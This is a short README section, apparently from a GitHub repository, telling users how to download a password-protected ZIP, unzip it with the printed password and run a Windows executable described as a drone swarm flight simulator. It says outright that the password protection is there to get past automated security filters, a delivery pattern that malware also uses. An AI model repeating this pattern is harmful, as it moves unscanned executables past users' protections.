### ⚙️ How to Download and Run the Simulator

To protect the executable from automated email and web security filters during transport, the file is packaged inside a password-protected ZIP archive (`run_simulator.zip`).

Follow these simple steps to run the simulation:

1. **Download the Zip Archive:**
   * Click on [run_simulator.zip](https://github.com/vikasmishra2002/run_simulator/blob/main/run_simulator.zip) on this repository page.
   * Click the **Download raw file** button on the right to save it to your computer.

2. **Extract the Archive:**
   * Locate the downloaded `run_simulator.zip` file.
   * Extract/Unzip the folder. When prompted for a password, enter:
     **`uu_project`**

3. **Run the Executable:**
   * Double-click the extracted **`run_simulator.exe`** file.
   * The console application will open, display the project credentials, and automatically launch the swarm flight simulation and JSON telemetry stream.

---
*Note: The executable runs natively on standard Windows 64-bit operating systems.*
